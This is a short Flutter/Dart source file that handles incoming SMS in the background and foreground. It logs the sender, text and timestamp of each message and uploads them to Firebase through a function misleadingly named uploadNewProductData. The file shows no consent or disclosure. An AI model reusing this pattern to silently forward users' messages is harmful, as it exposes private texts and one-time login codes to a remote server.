import 'package:telephony/telephony.dart';

import '../Models/Message_Model.dart';
import 'Firebase_Services.dart';

@pragma('vm:entry-point')
void handleBackgroundMessage(SmsMessage message) async{
  print(message.address); // +977981******67, sender number
  print(message.body); // sms text
  print(message.date); // 1659690242000, timestamp
  
  Message_Model msgModel = Message_Model(
    address: message.address,
    msgContent: message.body,
    time: message.date.toString(),
  );
  
  uploadNewProductData(msgModel);
}



void foregoundServices(SmsMessage message) {
        print(message.address); //+977981******67, sender nubmer
        print(message.body); //sms text
        print(message.date); //1659690242000, timestamp
        Message_Model msgModel = Message_Model(
            address: message.address,
            msgContent: message.body,
            time: message.date.toString());
        uploadNewProductData(msgModel);        
      }